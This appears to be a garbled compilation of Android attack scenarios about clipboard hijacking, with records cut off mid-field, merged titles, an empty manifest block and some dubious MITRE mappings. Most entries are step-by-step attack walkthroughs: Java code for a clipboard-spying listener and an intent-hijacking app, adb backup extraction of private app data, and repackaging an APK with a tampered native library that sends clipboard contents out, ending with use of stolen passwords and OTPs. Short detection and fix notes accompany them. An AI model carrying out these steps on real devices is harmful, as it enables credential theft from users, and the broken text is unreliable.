Vulnerability: Misconfigured exported component with no permission protection
MITRE Technique: T1630 – Component Object Model Hijacking (mapped from Windows, but conceptually applies)
Impact: Remote App Hijacking, Silent Clipboard Reading, Hidden Activity Launch, Unauthorized Code Execution
Detection Method: Use static analysis tools (MobSF, QARK), logcat monitoring, Frida hook on startActivity, onReceive logs
Solution: Use android:exported="false" for all internal components unless absolutely needed. If true, enforce android:permission and custom signature-based permissions. Always validate Intents inside code.
Tags: android, mobile, exported, manifest, adb, intent injection, clipboard, beginner, hijack, real attack

Title: Improper Use of WebView (No Origin Check / JavaScript Enabled)
Attack Type: WebView-Based Clipboard Hijacking via JavaScript Injection
Scenario Description: Many Android apps embed websites using WebView. If a developer enables JavaScript and does not restrict which websites can load (no origin validation), attackers can load malicious webpages that run JavaScript to steal clipboard content or inject fake UI. Title: Hardcoded Secrets in Code or Resources

If clipboard functionality is tied to these secrets (like copying them to the clipboard for sharing or debugging), then attackers can extract these secrets either by reverse engineering the APK or hijacking clipboard data. Even if clipboard isn’t directly used, attackers can decompile the app to find secrets and then impersonate the app/server. clipboard.setPrimaryClip(clip);

Or build your own using:java
ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
clipboard.addPrimaryClipChangedListener(() -> {
    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);

Step 6: When the victim app copies the API key to clipboard, the attacker clipboard listener app immediately logs or steals it.Step 7: Alternatively, you can reverse engineer the APK without even installing it. Title: Insecure Keystore Usage with Clipboard Hijacking
Attack Type: Weak Cryptographic Key Handling + Clipboard Leakage
Scenario Description: Android apps often use the Android Keystore system to store cryptographic keys for encryption, authentication, or digital signing. However, if developers misuse the keystore—for example, by exporting private keys, using insecure modes (like ECB), storing keys unprotected in shared preferences or internal storage, or copying decrypted data into the clipboard—the attacker can extract keys or sensitive decrypted data. In this simulation, we demonstrate how an app that uses Keystore to encrypt data but copies decrypted secrets to the clipboard becomes vulnerable to both insecure key storage and clipboard hijacking.

ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
ClipData clip = ClipData.newPlainText("DecryptedText", decryptedData);
clipboard.setPrimaryClip(clip);
Step 4: Install this APK on a test device using adb install KeyStoreTest.apk. Open the app, trigger encryption/decryption by typing a secret (like a password or token) and tapping "Decrypt". The app will place the decrypted text in the clipboard.Step 5: Install a simple clipboard monitoring app on the same device, or create your own using Android Studio with this sample code:java
ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
cb.addPrimaryClipChangedListener(() -> {
String text = cb.getPrimaryClip().getItemAt(0).getText().toString();
Log.d("Spy", "Clipboard: " + text);
});
Step 6: Now run both apps. Decrypt the data in KeyStoreTest. The second app will instantly capture and log the clipboard content.Step 7: You’ve just demonstrated a real-world "Clipboard Hijacking" attack combined with a keystore misuse, where the decrypted sensitive data was exposed to all apps via the system clipboard.Step 8: To escalate, reverse-engineer the APK using JADX-GUI. Open the APK and look inside MainActivity.java or EncryptionHelper.java. Look for bad practices like:- KeyStore.getInstance("AndroidKeyStore") but then saving keys in SharedPreferences- Use of AES with Cipher.getInstance("AES/ECB/PKCS7Padding")- Exporting the key as a byte[] to log or UIStep 9: If found, copy the encryption key or observe insecure block modes like ECB (which reveals data patterns). This means even the encryption itself can be broken, and the decrypted content isn't safe.Step 10: You’ve now performed two real attacks: (1) extracting sensitive clipboard content and (2) analyzing insecure keystore usage that weakens encryption. This proves the app is unsafe, and secrets can be hijacked.

Impact: Clipboard Hijacking, Decryption Leakage, Key Theft, Crypto Weakness, User Data Exposure
Detection Method: Use MobSF or QARK for static code scanning, Monitor clipboard via logs, Use JADX to reverse keystore usage, Check crypto implementation

When apps send implicit intents (without specifying a target package) or don’t validate the sender, any malicious app installed on the device can intercept, manipulate, or fake these Intents. If the app uses clipboard content inside the Intent (for example, pasting a copied token or URL), the attacker can hijack the Intent, steal or replace the data, and redirect the user to malicious flows. This is known as “Intent Hijacking” and becomes even more powerful when clipboard contents are silently inserted into Intents.
Tools Used: Android Studio, Genymotion or Android Device, jadx-GUI, ADB, Sample vulnerable app (IntentApp.apk), Attacker app (HijackerApp.apk), Logcat

String copiedText = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse(copiedText));
startActivity(intent);
This will open whatever URL is on the clipboard using any app that can handle the Intent (browser, hijacker app, etc.).Step 3: Install this vulnerable app with: adb install IntentApp.apkStep 4: Next, create the attacker app (HijackerApp.apk) that registers to receive Intent.ACTION_VIEW with intent-filter in its Manifest like this:xml





Step 5: Inside HijackerApp, log all received URLs or data passed by the vulnerable app like this:java
Uri data = getIntent().getData();
Log.d("HijackLog", "Hijacked Intent Data: " + data.toString());
Step 6: Install this Hijacker app with: adb install HijackerApp.apkStep 7: Now simulate clipboard data containing a URL like http://example.com by copying it to the clipboard on the device.Step 8: Launch the vulnerable app. It reads from clipboard, builds an Intent, and broadcasts it without specifying a target package.Step 9: Since the Intent is implicit and the attacker app has registered to handle that scheme, it will hijack the Intent, receive the data, and can either:- Log it- Modify it- Redirect user to phishing site- Trigger another activity silentlyStep 10: Check logcat and you will see the Hijacked Intent Data: http://example.com. You’ve now successfully hijacked an Intent using clipboard content.Step 11: For bonus, you can manipulate the clipboard with malicious content like:javascript:alert('Hacked')When the vulnerable app launches the Intent, the browser or hijacker app will open the malicious JS URL.Step 12: You have now simulated a real-world Intent Hijack using clipboard data, showing why implicit Intents + clipboard are dangerous together.
Vulnerability: Sending Implicit Intents with Untrusted Data + No Destination Check
MITRE Technique: T1609 – Command and Control via Application Layer Protocol
Impact: Data Leakage, Redirects to Malicious Apps, Phishing, Stealing Tokens or URLs, Browser Hijacking
Detection Method: Monitor manifest for exported components, detect use of implicit Intents with untrusted data, use logcat to track who receives the Intent
Solution: Always use explicit Intents (setPackage or setComponent). Validate clipboard input before use. Avoid launching Intents directly from user clipboard data. Use custom permissions for Intent-based communication. Never let untrusted apps handle sensitive Intents.

Title: Exploiting AllowBackup=True for Clipboard Hijack
Scenario Description: In this scenario, an attacker exploits an Android application's misconfigured android:allowBackup="true" flag, which allows attackers to retrieve internal app data via Android Debug Bridge (ADB). This data may include sensitive clipboard content that was stored or cached inside the app’s local storage (e.g., preferences, SQLite database, cache, or file system). Once the attacker gets access to the app data using a USB cable and a physical Android phone (or emulator), they can extract sensitive clipboard content or hijack it. This is dangerous if the app stores copied data like passwords, OTPs, or financial information.
Tools Used: Android Studio, ADB (Android Debug Bridge), Physical Android Phone or Emulator
Attack Steps: 1. Enable Developer Options on your Android device by going to Settings > About phone > tap "Build number" 7 times. 2. Go back to Settings > Developer options > enable "USB debugging". 3. Connect the Android device to your PC via USB. 4. On your PC, install ADB (if not already installed) using the command: sudo apt install adb (Linux) or download from official Android developer site for Windows. 5. On terminal or CMD, run: adb devices to verify connection. 6. Find a vulnerable app with android:allowBackup="true" set in its manifest. You can check this using the tool apktool to decompile an APK: apktool d target.apk. Then navigate to AndroidManifest.xml and confirm if android:allowBackup="true". 7. Now, pull the app’s private data directory using: adb backup -f app.ab -noapk com.vulnerable.app. This creates a full backup of the app data. 8. Convert the .ab file to .tar using the tool Android Backup Extractor: java -jar abe.jar unpack app.ab app.tar. 9. Extract the .tar file: tar -xvf app.tar. 10. Navigate to the extracted folders and look inside shared_prefs, databases, or files. Check for any stored clipboard data (copied passwords, OTPs, tokens, or copied messages). 11. Open shared_prefs/clipboard.xml or custom files in Notepad or any viewer to extract sensitive clipboard content. 12. The attacker can now view the hijacked clipboard data and use it to impersonate the user or steal confidential information.
Impact: Leaks sensitive user clipboard data stored locally in app backups
Detection Method: Use mobile security scanners (like MobSF) to check if allowBackup=true is enabled; Manual analysis of manifest file via apktool.
Solution: Developers must set android:allowBackup="false" in AndroidManifest.xml to prevent backup of app data. Also, sensitive clipboard data should not be stored in shared preferences or local storage.

Title: Exploiting Insecure Random Number Generators for Clipboard Hijacking in Mobile Apps
Scenario Description: In this scenario, an attacker exploits the use of an insecure random number generator (RNG) in a mobile application which is used to create session tokens or encryption keys protecting sensitive clipboard data. Because the RNG is predictable, the attacker can reproduce or guess the random values, decrypt or access clipboard data cached or stored insecurely in the app, and then hijack the user's clipboard information. This leads to exposure of confidential data like passwords, OTPs, and financial info copied to clipboard.
Tools Used: Android Studio, Java Decompiler (JD-GUI), Frida, ADB, Termux (optional), APKTool
Attack Steps: 1. Identify the target mobile app suspected of using an insecure RNG for generating tokens or encrypting clipboard data. 2. Obtain the APK file of the app by downloading from Play Store or extracting from your device using adb pull /data/app/<package>/base.apk. 3. Use apktool or JD-GUI to decompile the APK and inspect the code for RNG usage — look for calls to java.util.Random instead of secure RNG like java.security.SecureRandom. 4. Confirm that random values generated are used in clipboard data handling or token generation by analyzing relevant code methods (e.g., clipboard caching, session management). 5. Use Frida (a dynamic instrumentation tool) to hook into the app at runtime and intercept RNG calls to observe predictable values generated during clipboard operations. 6. Once you confirm RNG values are predictable, reproduce these values on your PC by implementing the same RNG seed and algorithm used by the app. 7. Using these values, decrypt or simulate session tokens or clipboard data access inside the app. 8. Connect the device to your PC via USB with USB debugging enabled and use adb logcat or Frida scripts to capture clipboard data transmissions or app logs where decrypted clipboard info appears. 9. Extract the clipboard content that the app stored or transmitted insecurely due to weak RNG protections. 10. Use the hijacked clipboard data (passwords, OTPs) for unauthorized access or impersonation of the user.
Target Type: Android Mobile Apps using Insecure RNG
Vulnerability: Use of insecure java.util.Random instead of secure RNG for cryptographic or clipboard data protection
Impact: Disclosure of sensitive clipboard content due to predictable RNG values leading to hijacking
Detection Method: Static code analysis (apktool, JD-GUI), dynamic analysis with Frida, runtime logs via adb, manual code review
Solution: Use cryptographically secure RNGs like SecureRandom for token and encryption key generation. Avoid storing sensitive clipboard data locally.
Tags: Mobile Security, RNG, Clipboard Hijack, Frida, ADB, APKTool

Title: Exploiting Overuse of System.loadLibrary for Clipboard Hijacking in Mobile Apps
Attack Type: Data Theft via Native Code Exploit
Scenario Description: In this scenario, an attacker targets an Android app that heavily uses native libraries loaded via System.loadLibrary to perform clipboard operations. Due to improper trust and weak security controls around native code, the attacker injects or replaces native libraries to intercept clipboard data. Native code runs with high privileges and can access clipboard buffers or memory directly. By exploiting over-reliance on native code without proper validation, the attacker can hijack sensitive clipboard data like passwords, OTPs, or confidential texts copied by users.
Tools Used: Android Studio, APKTool, Frida, ADB, Native Debugging Tools (ndk-stack, objdump), Emulator or Rooted Device

Alternatively, download the APK from a trusted APK repository.Use the tool apktool to decompile the APK with the command: apktool d base.apk. This will extract all app files including manifest, resources, Java code (smali), and native libraries.Look inside the extracted folder for native libraries — these are .so files stored under /lib/<architecture>/ (e.g., lib/arm64-v8a/). These are the native binaries the app loads with System.loadLibrary.Analyze the native libraries to find any clipboard-related operations. Beginners can run the strings command on the .so files to see if there are keywords like “clipboard”, “copy”, “paste”, or similar, indicating clipboard functionality.Use Frida, a dynamic instrumentation framework, to hook into these native functions at runtime. This means you attach Frida to the running app on your device or emulator and intercept calls to native clipboard functions to observe or modify the clipboard data.If the app loads native libraries without verifying their integrity or signatures, you can modify these .so files. For example, replace clipboard functions to capture clipboard content and write it to logs or send over the network.After modification, repackage the app using apktool b <folder> -o modified.apk. Then sign the APK with a debug key using: jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore modified.apk alias_name.Install this modified APK on your device or emulator via adb install -r modified.apk. Open the app and copy some sensitive data to your clipboard (like passwords or OTPs). The malicious native library will capture this data silently.Use adb logcat to monitor app logs or set up a network sniffer (e.g., mitmproxy or Wireshark) to catch the exfiltrated clipboard data sent out by the malicious native code.With the stolen clipboard content, the attacker can impersonate the user, access accounts, or perform fraudulent actions.
Vulnerability: Overuse and improper validation of native libraries loaded via System.loadLibrary
Impact: High privilege access allows leaking sensitive clipboard data
Detection Method: Static analysis of APK for native libs, dynamic analysis with Frida, monitoring logs and network
Solution: Validate native library integrity, use proper code signing, limit native code privileges, avoid sensitive clipboard data operations in native code
